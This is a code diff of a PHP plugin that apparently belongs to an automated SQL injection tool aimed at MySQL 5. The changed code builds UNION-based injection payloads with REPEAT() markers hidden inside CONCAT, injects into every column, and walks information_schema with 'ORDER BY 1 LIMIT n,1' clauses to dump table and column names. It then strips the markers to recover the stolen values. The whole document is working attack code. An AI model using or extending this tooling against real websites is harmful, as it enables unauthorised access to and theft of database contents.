@@ -13,7 +13,6 @@
 			private	$_step							=	10;			//step LIMIT _currentRegisterStep,_currentRegisterStep+_step
 			private	$_currentRegisterStep		=	0;
 			private	$_fields							=	NULL;			//table fields
-			private	$_useConcat						=	FALSE;		//Concat values with a tag like <aidsql></aidsql>
 			private	$_groupConcatLength			=	1024;			//Default group concat character length
 			private	$_openTag						=	NULL;
 			private	$_closeTag						=	NULL;
@@ -25,6 +24,8 @@
 			private	$_affectedDatabases			=	array("mysql5");
 			private	$_getCompleteSchema			=	TRUE;
 			private	$_version						=	NULL;
+			private	$_strRepeat						=	100;
+			private	$_repeatCharacter				=	"1";
 
 			public function getPluginName(){
 				return self::PLUGIN_NAME;
@@ -114,8 +115,6 @@
 				$vars			=	$this->orderRequestVariables($vars);
 				$found		=	FALSE;
 
-				$this->setUseConcat(TRUE);
-
 				$keys	=	array_keys($this->_config);
 
 				if(in_array("numeric-only",$keys)){
@@ -192,22 +191,15 @@
 
 										$this->log($this->_httpAdapter->getUrl(),0,"light_green",TRUE);
 										$this->log("FOUND SQL INJECTION!!!",0,"light_green",TRUE);
-										$this->log("Affected Variable:\t$variable");
-										$this->log("Affected Fields:\t".implode($matches,","));
-										$this->log("Field Count:\t$i");
-
-										$field = $this->pickRandomValue($matches);
-
-										$this->log("Picking field \"$field\" to perform further analysis ...");
+										$this->log("Affected Variable\t:\t$variable",0,"light_purple");
+										$this->log("Field Count\t\t:\t$i",0,"light_purple");
 
 										//Actually we can have a series of childNodes here any field is good, so we just pick
 										//a random field.
 	
 										$this->log("Checking database version ... ",0,"green");
 										$this->setAffectedVariable($variable,$value);
-										$this->setAffectedField($field);
 										$this->setMaxFields($i);
-
 
 										return TRUE;
 
@@ -242,68 +234,16 @@
 			}
 
 
-			public function setTotalRegisters($totalRegisters=0){
-
-				$totalRegisters=(int)$totalRegisters;
-
-				if(!$totalRegisters){
-					throw (new \Exception("Total registers should be an integer greater than 0"));
-				}
-
-				$this->_totalRegisters = $totalRegisters;
-
-			}
-
-			public function setUseConcat($value=FALSE){
-
-				$this->_useConcat=(boolean)$value;
-
-			}
-
-			private function generateRandomTag(){
-
-				$rand = substr(md5(rand(0,time())),0,4);
-				return "i$rand";
-
-			}
-
-
-			public function setOpenTag($openTag){
-				$this->_openTag = $openTag;
-			}
-
-
-			public function setCloseTag($closeTag){
-				$this->_closeTag = $closeTag;
-			}
-
-
 			public function getOpenTag(){
 
-				return "9e99";
-
-				if(!empty($this->_openTag)){
-					return $this->_openTag;
-				}
-
-				$this->setOpenTag($this->generateRandomTag());
-
-				return $this->_openTag;
+				return $this->_openTag	=	"REPEAT(".\String::hexEncode($this->_repeatCharacter).",".$this->_strRepeat.')';
 
 			}
 
 
 			public function getCloseTag(){
 
-				return "9e99";
-
-				if(!empty($this->_closeTag)){
-					return $this->_closeTag;
-				}
-
-				$this->setCloseTag($this->generateRandomTag());
-
-				return $this->_closeTag;
+				return $this->_closeTag	=	"REPEAT(".\String::hexEncode($this->_repeatCharacter).",".$this->_strRepeat.')';
 
 			}
 
@@ -313,15 +253,11 @@
 				$pre	= NULL;
 				$post	= NULL;
 
-				if($this->_useConcat){
+				$openConcatTag		=	$this->getOpenTag();
+				$closeConcatTag	=	$this->getCloseTag();
 
-					$openConcatTag		=	\String::hexEncode($this->getOpenTag());
-					$closeConcatTag	=	\String::hexEncode($this->getCloseTag());
-
-					$pre					=	"CONCAT($openConcatTag,";
-					$post					=	",$closeConcatTag)";
-
-				}
+				$pre					=	"CONCAT($openConcatTag,";
+				$post					=	",$closeConcatTag)";
 
 				return $pre.$string.$post;
 
@@ -447,6 +383,7 @@
 					throw(new \Exception("Database version mismatch: $version, cant get database schema!"));
 				}
 
+
 				//Determines server global variable @@group_concat_max_len
 				$this->getGroupConcatLength();
 
@@ -465,13 +402,13 @@
 					$select									=	"TABLE_NAME";
 					$from										=	"FROM information_schema.tables WHERE table_schema=DATABASE()";
 
-					$this->_currTerminatingPayload	=	"ORDER BY ".$this->_affectedField." LIMIT ".$limit++.",1";
+					$this->_currTerminatingPayload	=	"ORDER BY 1 LIMIT ".$limit++.",1";
 
 					while($table	=	$this->execute($select,$from)){
 
 						$this->log("Discovered table $table!",0,"light_purple");
 						
-						$restoreTPayLoad	=	$this->_currTerminatingPayload	=	"ORDER BY ".$this->_affectedField." LIMIT ".$limit++.",1";
+						$restoreTPayLoad	=	$this->_currTerminatingPayload	=	"ORDER BY 1 LIMIT ".$limit++.",1";
 
 						//Add just the table to the table to the DatabaseSchema Object
 						//Columns are retrieved from the runner, this is just because some people
@@ -517,7 +454,7 @@
 														"AND table_name=".\String::hexEncode($table);
 
 				$restoreTerminatingPayload	=	$this->_currTerminatingPayload;
-				$this->_currTerminatingPayload	=	"ORDER BY ".$this->_affectedField;
+				$this->_currTerminatingPayload	=	"ORDER BY 1 DESC";
 
 				$tableFields	=	$this->execute($select,$from);
 
@@ -531,7 +468,7 @@
 
 					while($field	=	$this->execute($select,$from)){
 
-						$this->_currTerminatingPayload	=	"ORDER BY ".$this->_affectedField." LIMIT ".$limit.",1";
+						$this->_currTerminatingPayload	=	"ORDER BY 1 LIMIT ".$limit.",1";
 						$limit++;
 						$tableFields[]	=	$field;
 
@@ -560,6 +497,14 @@
 
 				$select	= "DATABASE()";
 				return $this->execute($select);
+
+			}
+
+			private function cleanUpResult($result){
+
+				$result	=	substr($result,$this->_strRepeat);
+				$result	=	substr($result,0,$this->_strRepeat*-1);
+				return $result;
 
 			}
 
@@ -602,7 +547,7 @@
 				}
 
 				if(isset($result[0])){
-					return $result[0];
+					return $this->cleanUpResult($result[0]);
 				}
 
 				return FALSE;
@@ -687,27 +632,9 @@
 
 				}
 
-				if(!isset($this->_affectedField)){
-
-					throw (new \Exception("Cant generate injection with no AFFECTED field set!"));
-
-				}
-
 				for($i=1;$i<=$this->_maxFields;$i++){
 
-					if($i==$this->_affectedField){
-
-						if($concat){
-							$fields[]=$this->tagConcat($select);
-						}else{
-							$fields[]=$select;
-						}
-
-					}else{
-
-						$fields[]=$i;
-
-					}
+					$fields[]=$this->tagConcat($select);
 
 				}
 
@@ -767,9 +694,9 @@
 
 				$openTag		=	$this->getOpenTag();
 				$closeTag	=	$this->getCloseTag();
-				$this->log("String identifier is: $openTag - $closeTag",0,"white");
 
-				$regex	= '/'.$openTag."+.*".$closeTag.'/';
+				$repeat	=	str_repeat($this->_repeatCharacter,$this->_strRepeat);
+				$regex	= '/'.$repeat."+.*".$repeat.'/';
 
 				$matches = NULL;
 
